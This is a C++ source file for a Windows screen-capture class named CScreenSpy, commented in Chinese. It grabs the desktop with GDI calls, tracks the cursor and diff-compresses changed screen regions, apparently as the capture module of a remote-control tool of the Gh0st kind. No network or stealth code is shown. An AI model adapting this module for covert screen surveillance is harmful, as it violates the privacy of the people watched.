// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenSpy.h"
#include "Common.h"
#include <stdio.h>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenSpy::CScreenSpy(ULONG ulbiBitCount)
{
	m_bAlgorithm = ALGORITHM_DIFF;
	m_dwBitBltRop = SRCCOPY;
	m_BitmapInfor_Full = NULL;
	switch (ulbiBitCount)
	{
	case 16:
	case 32:
		m_ulbiBitCount = ulbiBitCount;
		break;
	default:
		m_ulbiBitCount = 16;
	}

	m_hDeskTopWnd = GetDesktopWindow();
	m_hFullDC = GetDC(m_hDeskTopWnd);

	m_hFullMemDC	= CreateCompatibleDC(m_hFullDC);
	//::GetSystemMetrics(SM_CXSCREEN/SM_CYSCREEN)获取屏幕大小不准
	//例如当屏幕显示比例为125%时，获取到的屏幕大小需要乘以1.25才对
	DEVMODE devmode;
	memset(&devmode, 0, sizeof (devmode));	
	devmode.dmSize = sizeof(DEVMODE);
	devmode.dmDriverExtra = 0;
	BOOL Isgetdisplay = EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &devmode);
	m_ulFullWidth = devmode.dmPelsWidth;
	m_ulFullHeight = devmode.dmPelsHeight;
	printf("===> 桌面分辨率大小为：%d x %d\n", m_ulFullWidth, m_ulFullHeight);
	m_BitmapInfor_Full = ConstructBI(m_ulbiBitCount,m_ulFullWidth, m_ulFullHeight);
	m_BitmapData_Full = NULL;
	m_BitmapHandle	= ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, 
		DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);
	::SelectObject(m_hFullMemDC, m_BitmapHandle);

	m_RectBuffer = new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage * 2];

	m_RectBufferOffset = 0;

	m_hDiffMemDC	= CreateCompatibleDC(m_hFullDC); 
	m_DiffBitmapHandle	= ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, 
		DIB_RGB_COLORS, &m_DiffBitmapData_Full, NULL, NULL);
	::SelectObject(m_hDiffMemDC, m_DiffBitmapHandle);
}


CScreenSpy::~CScreenSpy()
{
	ReleaseDC(m_hDeskTopWnd, m_hFullDC);   //GetDC
	if (m_hFullMemDC!=NULL)
	{
		DeleteDC(m_hFullMemDC);                //Create匹配内存DC

		::DeleteObject(m_BitmapHandle);
		if (m_BitmapData_Full!=NULL)
		{
			m_BitmapData_Full = NULL;
		}

		m_hFullMemDC = NULL;
	}

	if (m_hDiffMemDC!=NULL)
	{
		DeleteDC(m_hDiffMemDC);                //Create匹配内存DC

		::DeleteObject(m_DiffBitmapHandle);
		if (m_DiffBitmapData_Full!=NULL)
		{
			m_DiffBitmapData_Full = NULL;
		}
	}

	if (m_BitmapInfor_Full!=NULL)
	{
		delete[] m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	if (m_RectBuffer)
	{
		delete[] m_RectBuffer;
		m_RectBuffer = NULL;
	}

	m_RectBufferOffset = 0;
}


ULONG CScreenSpy::GetBISize()
{
	ULONG	ColorNum = m_ulbiBitCount <= 8 ? 1 << m_ulbiBitCount : 0;

	return sizeof(BITMAPINFOHEADER) + (ColorNum * sizeof(RGBQUAD));
}

LPBITMAPINFO CScreenSpy::GetBIData()
{
	return m_BitmapInfor_Full;  
}

LPBITMAPINFO CScreenSpy::ConstructBI(ULONG ulbiBitCount, 
									 ULONG ulFullWidth, ULONG ulFullHeight)
{
	int	ColorNum = ulbiBitCount <= 8 ? 1 << ulbiBitCount : 0;
	ULONG ulBitmapLength  = sizeof(BITMAPINFOHEADER) + (ColorNum * sizeof(RGBQUAD));   //BITMAPINFOHEADER +　调色板的个数
	BITMAPINFO	*BitmapInfor = (BITMAPINFO *) new BYTE[ulBitmapLength]; //[][]

	BITMAPINFOHEADER* BitmapInforHeader = &(BitmapInfor->bmiHeader);

	BitmapInforHeader->biSize = sizeof(BITMAPINFOHEADER);//pi si 
	BitmapInforHeader->biWidth = ulFullWidth; //1080
	BitmapInforHeader->biHeight = ulFullHeight; //1920
	BitmapInforHeader->biPlanes = 1;
	BitmapInforHeader->biBitCount = ulbiBitCount; //32
	BitmapInforHeader->biCompression = BI_RGB;
	BitmapInforHeader->biXPelsPerMeter = 0;
	BitmapInforHeader->biYPelsPerMeter = 0;
	BitmapInforHeader->biClrUsed = 0;
	BitmapInforHeader->biClrImportant = 0;
	BitmapInforHeader->biSizeImage = 
		((BitmapInforHeader->biWidth * BitmapInforHeader->biBitCount + 31)/32)*4* BitmapInforHeader->biHeight;

	// 16位和以后的没有颜色表，直接返回

	return BitmapInfor;
}

LPVOID CScreenSpy::GetFirstScreenData()
{
	//用于从原设备中复制位图到目标设备
	::BitBlt(m_hFullMemDC, 0, 0, 
		m_ulFullWidth, m_ulFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);

	return m_BitmapData_Full;  //内存
}


ULONG CScreenSpy::GetFirstScreenLength()
{
	return m_BitmapInfor_Full->bmiHeader.biSizeImage; 
}

LPVOID CScreenSpy::GetNextScreenData(ULONG* ulNextSendLength)
{
	if (ulNextSendLength == NULL || m_RectBuffer == NULL)
	{
		return NULL;
	}

	// 重置rect缓冲区指针
	m_RectBufferOffset = 0;  

	// 写入使用了哪种算法
	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

	// 写入光标位置
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));

	// 写入当前光标类型
	BYTE	bCursorIndex = m_CursorInfor.GetCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

	// 差异比较算法
	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// 分段扫描全屏幕  将新的位图放入到m_hDiffMemDC中
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_BitmapInfor_Full->bmiHeader.biWidth,
			m_BitmapInfor_Full->bmiHeader.biHeight);

		//两个Bit进行比较如果不一样修改m_lpvFullBits中的返回
		*ulNextSendLength = m_RectBufferOffset + 
			CompareBitmap((LPBYTE)m_DiffBitmapData_Full, (LPBYTE)m_BitmapData_Full,
			m_RectBuffer + m_RectBufferOffset, m_BitmapInfor_Full->bmiHeader.biSizeImage);	
		return m_RectBuffer;
	}

	return NULL;
}


VOID CScreenSpy::WriteRectBuffer(LPBYTE	szBuffer,ULONG ulLength)
{
	memcpy(m_RectBuffer + m_RectBufferOffset, szBuffer, ulLength);   
	m_RectBufferOffset += ulLength;
}


VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHeight)
{
#ifdef COPY_ALL
	BitBlt(hdcDest, 0, 0, ulWidth, ulHeight, hdcSour, 0, 0, m_dwBitBltRop);
#else
	const ULONG	ulJumpLine = 50;
	const ULONG	ulJumpSleep = ulJumpLine / 10; 

	for (int i = 0, ulToJump = 0; i < ulHeight; i += ulToJump)
	{
		ULONG  ulv1 = ulHeight - i;  

		if (ulv1 > ulJumpLine)  
			ulToJump = ulJumpLine; 
		else
			ulToJump = ulv1;
		BitBlt(hdcDest, 0, i, ulWidth, ulToJump, hdcSour,0, i, m_dwBitBltRop);
		Sleep(ulJumpSleep);
	}
#endif
}

ULONG CScreenSpy::CompareBitmap(LPBYTE CompareSourData, LPBYTE CompareDestData, 
								LPBYTE szBuffer, DWORD ulCompareLength)
{
	// Windows规定一个扫描行所占的字节数必须是4的倍数, 所以用DWORD比较
	LPDWORD	p1, p2;
	p1 = (LPDWORD)CompareDestData;
	p2 = (LPDWORD)CompareSourData;

	// 偏移的偏移，不同长度的偏移
	ULONG ulszBufferOffset = 0, ulv1 = 0, ulv2 = 0;
	ULONG ulCount = 0; // 数据计数器
	// p1++实际上是递增了一个DWORD
	for (int i = 0; i < ulCompareLength; i += 4, p1++, p2++)
	{
		if (*p1 == *p2)  
			continue;
		// 一个新数据块开始
		// 写入偏移地址

		*(LPDWORD)(szBuffer + ulszBufferOffset) = i;     
		// 记录数据大小的存放位置
		ulv1 = ulszBufferOffset + sizeof(int);  //4
		ulv2 = ulv1 + sizeof(int);    //8
		ulCount = 0; // 数据计数器归零

		// 更新Dest中的数据
		*p1 = *p2;
		*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;

		/*
		[1][2][3][3]          
		[1][3][2][1]

		[0000][   ][1321]
		*/
		ulCount += 4;
		i += 4, p1++, p2++;	
		for (int j = i; j < ulCompareLength; j += 4, i += 4, p1++, p2++)
		{
			if (*p1 == *p2)
				break;

			// 更新Dest中的数据
			*p1 = *p2;
			*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;
			ulCount += 4;
		}
		// 写入数据长度
		*(LPDWORD)(szBuffer + ulv1) = ulCount;
		ulszBufferOffset = ulv2 + ulCount;	
	}

	// nOffsetOffset 就是写入的总大小
	return ulszBufferOffset;
}
